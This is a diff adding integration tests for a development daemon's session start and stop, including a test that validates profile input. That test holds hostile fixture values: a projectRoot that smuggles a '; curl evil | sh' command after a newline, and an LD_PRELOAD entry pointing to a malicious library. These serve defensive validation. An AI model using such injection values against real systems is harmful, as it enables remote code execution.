@@ -150,6 +150,140 @@ describe("daemon session boot (integration)", () => {
     }
   }, 20_000);
 
+  it("start → stop → start succeeds on the same daemon", async () => {
+    const { path: worktree, cleanup } = makeTestWorktree();
+    cleanups.push(cleanup);
+
+    const daemon = await spawnTestDaemon(worktree, {
+      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
+    });
+    liveHandles.push(daemon);
+
+    const profile = {
+      name: "test",
+      isDefault: true,
+      worktree: null,
+      branch: "main",
+      platform: "ios",
+      mode: "quick",
+      metroPort: 8081,
+      devices: {},
+      buildVariant: "debug",
+      preflight: { checks: [], frequency: "once" },
+      onSave: [],
+      env: {},
+      projectRoot: worktree,
+    };
+
+    // First cycle.
+    const start1 = await daemon.client.send({
+      type: "command",
+      action: "session/start",
+      id: "s1",
+      payload: { profile },
+    });
+    expect((start1.payload as { status: string }).status).toBe("starting");
+    await waitForStatus(daemon, "running", 3_000);
+    await daemon.client.send({
+      type: "command",
+      action: "session/stop",
+      id: "x1",
+    });
+    await waitForStatus(daemon, "stopped", 3_000);
+
+    // Second cycle on the same daemon — exercises IPC-handler
+    // re-registration, epoch reset, module registry re-creation.
+    const start2 = await daemon.client.send({
+      type: "command",
+      action: "session/start",
+      id: "s2",
+      payload: { profile },
+    });
+    expect((start2.payload as { status: string }).status).toBe("starting");
+    await waitForStatus(daemon, "running", 3_000);
+    await daemon.client.send({
+      type: "command",
+      action: "session/stop",
+      id: "x2",
+    });
+    await waitForStatus(daemon, "stopped", 3_000);
+  }, 20_000);
+
+  it("rejects profile payloads that would allow shell injection or env-var pre-loading", async () => {
+    const { path: worktree, cleanup } = makeTestWorktree();
+    cleanups.push(cleanup);
+
+    const daemon = await spawnTestDaemon(worktree, {
+      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
+    });
+    liveHandles.push(daemon);
+
+    const baseProfile = {
+      name: "test",
+      isDefault: true,
+      worktree: null,
+      branch: "main",
+      platform: "ios",
+      mode: "quick",
+      metroPort: 8081,
+      devices: {},
+      buildVariant: "debug",
+      preflight: { checks: [], frequency: "once" },
+      onSave: [],
+      env: {},
+      projectRoot: worktree,
+    };
+
+    // Shell-injection attempt via profile.projectRoot: newline-laden
+    // path that would have broken the watchman `sh -c` argument before
+    // argv-form + validation.
+    const shellInject = await daemon.client.send({
+      type: "command",
+      action: "session/start",
+      id: "inj-1",
+      payload: {
+        profile: { ...baseProfile, projectRoot: "/tmp/x\n; curl evil | sh" },
+      },
+    });
+    expect(
+      (shellInject.payload as { code?: string }).code,
+    ).toBe("E_PROFILE_PATH_NEWLINE");
+
+    // profile.env denylist — LD_PRELOAD must be rejected before any
+    // subprocess gets it on their environ.
+    const ldPreload = await daemon.client.send({
+      type: "command",
+      action: "session/start",
+      id: "inj-2",
+      payload: {
+        profile: { ...baseProfile, env: { LD_PRELOAD: "/tmp/evil.so" } },
+      },
+    });
+    expect((ldPreload.payload as { code?: string }).code).toBe(
+      "E_PROFILE_ENV_BANNED",
+    );
+
+    // Invalid port.
+    const badPort = await daemon.client.send({
+      type: "command",
+      action: "session/start",
+      id: "inj-3",
+      payload: { profile: { ...baseProfile, metroPort: 70000 } },
+    });
+    expect((badPort.payload as { code?: string }).code).toBe(
+      "E_PROFILE_METRO_PORT",
+    );
+
+    // After all three rejections, the daemon is still healthy —
+    // a malformed session/start must not wedge the RPC dispatch.
+    const ping = await daemon.client.send({
+      type: "command",
+      action: "daemon/ping",
+      id: "ping-after-inj",
+    });
+    expect(ping.type).toBe("response");
+  }, 15_000);
+
   it("rejects session/start when a session is already running", async () => {
     const { path: worktree, cleanup } = makeTestWorktree();
     cleanups.push(cleanup);
